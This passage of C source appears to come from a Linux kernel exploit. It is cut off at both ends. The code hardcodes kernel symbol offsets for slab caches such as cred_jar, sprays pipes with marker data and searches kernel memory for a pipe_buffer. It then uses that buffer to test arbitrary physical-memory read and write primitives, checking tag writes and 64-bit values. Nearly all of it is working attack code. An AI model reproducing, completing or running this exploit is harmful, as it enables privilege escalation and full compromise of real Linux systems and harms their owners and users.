        {"cred_jar", 0x2e27ba0ULL},
        {"filp_cachep", 0x2ab0488ULL},
        {"dentry_cache", 0x2ab04b8ULL},
        {"anon_vma_cachep", 0x30382c8ULL},
        {"files_cachep", 0x2e26dd8ULL},
        {"signal_cachep", 0x2e26dd0ULL},
        {"sighand_cachep", 0x2e26dc8ULL},
      };
      for (size_t i = 0; i < sizeof(ident) / sizeof(ident[0]); i++) {
        uint64_t ptr =
          kernel_read64(fd, data_addr(KIMAGE_TEXT_BASE + ident[i].off));
        int match = ptr == pipe_page_slab_cache[0];
        pr_info("phys step ident %s=%016llx match=%d\n", ident[i].name,
                (unsigned long long)ptr, match);
      }
    }
    return 0;
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < pipe_reclaim_cnt; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
          found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
          pipe_scan_ops, pipe_scan_len);
  pr_info("phys step first page=%016llx off=%u len=%u flags=%08x ops=%016llx "
          "priv=%016llx want_ops=%016llx want_fl=%x q0=%016llx q1=%016llx\n",
          (unsigned long long)pipe_scan_first_page, pipe_scan_first_offset,
          pipe_scan_first_len, pipe_scan_first_flags,
          (unsigned long long)pipe_scan_first_ops,
          (unsigned long long)pipe_scan_first_private,
          (unsigned long long)pipe_buf_ops_addr(), PIPE_BUF_FLAG_CAN_MERGE,
          (unsigned long long)pipe_scan_q0, (unsigned long long)pipe_scan_q1);
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));

  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
  physrw_read64_before = pipe_read64(fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  kernel_read_data(
      fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  return physrw_read_ok &&
         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
         physrw_write_ok &&
         memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
         physrw_read64_ok && physrw_write64_ok;
}
